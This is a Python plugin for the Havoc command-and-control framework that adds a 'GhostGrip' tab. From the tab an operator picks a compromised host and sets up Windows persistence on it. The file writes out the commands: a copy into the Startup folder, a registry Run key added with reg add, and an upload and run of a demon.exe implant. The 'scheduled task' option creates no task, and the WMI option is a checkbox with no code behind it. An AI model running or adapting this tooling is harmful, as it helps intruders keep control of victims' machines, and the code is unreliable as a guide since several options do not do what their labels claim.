#!/usr/bin/env python
# Author: Mr.R4tC4k3

import havocui
import havoc
import os

custom_persistence = havocui.Widget("GhostGrip", True)

demons = []
selected_demon = None

# Define your checkbox variables
startup_persistence = False
scheduled_task_persistence = False
registry_persistence = False

def set_demon(index):
    global demons
    global selected_demon
    if index != 0:
        selected_demon = havoc.Demon(demons[index-1])

def toggle_startup_persistence():
    global startup_persistence
    startup_persistence = not startup_persistence

def toggle_scheduled_task_persistence():
    global scheduled_task_persistence
    scheduled_task_persistence = not scheduled_task_persistence

def toggle_registry_persistence():
    global registry_persistence
    registry_persistence = not registry_persistence
    
def toggle_wmi_persistence():
    global wmi_persistence
    wmi_persistence = not wmi_persistence

def run_custom_persistence():
    global selected_demon
    global startup_persistence
    global scheduled_task_persistence
    global registry_persistence

    if selected_demon is None:
        havocui.messagebox("ERROR", "Please select a demon!")
        return

    # Build and execute the commands based on the selected options
    if startup_persistence:
        TaskID = selected_demon.ConsoleWrite(selected_demon.CONSOLE_TASK, "Tasked demon to add Shell:Startup persistence!")
        command = 'powershell copy C:\\Windows\\System32\\notepad.exe "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notepad.exe"'
        selected_demon.Command(TaskID, command)
    
    if scheduled_task_persistence:
        TaskID = selected_demon.ConsoleWrite(selected_demon.CONSOLE_TASK, "Tasked demon to add Scheduled Task persistence!")
        uploadcommand = 'upload /home/kali/Documents/demon.exe demon2.exe'
        command = 'powershell demon2.exe'
        selected_demon.Command(TaskID, uploadcommand, command)
    
    if registry_persistence:
        TaskID = selected_demon.ConsoleWrite(selected_demon.CONSOLE_TASK, "Tasked demon to add Registry persistence!")
        command = 'powershell reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NotepadPersistence" /t REG_SZ /d "C:\\Windows\\System32\\notepad.exe" /f'
        selected_demon.Command(TaskID, command)

def custom_persistence_ui():
    custom_persistence.clear()
    global demons
    demons = havoc.GetDemons()
    
    custom_persistence.addLabel("<h2 style='color: orange;'>GHOSTGRIP</h2>")
    custom_persistence.addLabel("<span style='color: #cc8706;'>Silent Squeeze. Unbreakable Hold. </h7>")
    custom_persistence.addLabel("<h3 style='color: orange;'>Select a demon</h3>")
    custom_persistence.addCombobox(set_demon, "Select demon", *demons)
    custom_persistence.addLabel("<h3 style='color: orange;'>Select a persistence mechanism</h3>")
    custom_persistence.addCheckbox("Add Shell:Startup Persistence", toggle_startup_persistence)
    custom_persistence.addCheckbox("Add Scheduled Task Persistence", toggle_scheduled_task_persistence)
    custom_persistence.addCheckbox("Add Registry Key Persistence", toggle_registry_persistence)
    custom_persistence.addCheckbox("Add WMI Event Persistence", toggle_wmi_persistence)
    
    custom_persistence.addButton("Persist", run_custom_persistence)
    custom_persistence.setSmallTab()

custom_persistence_ui()
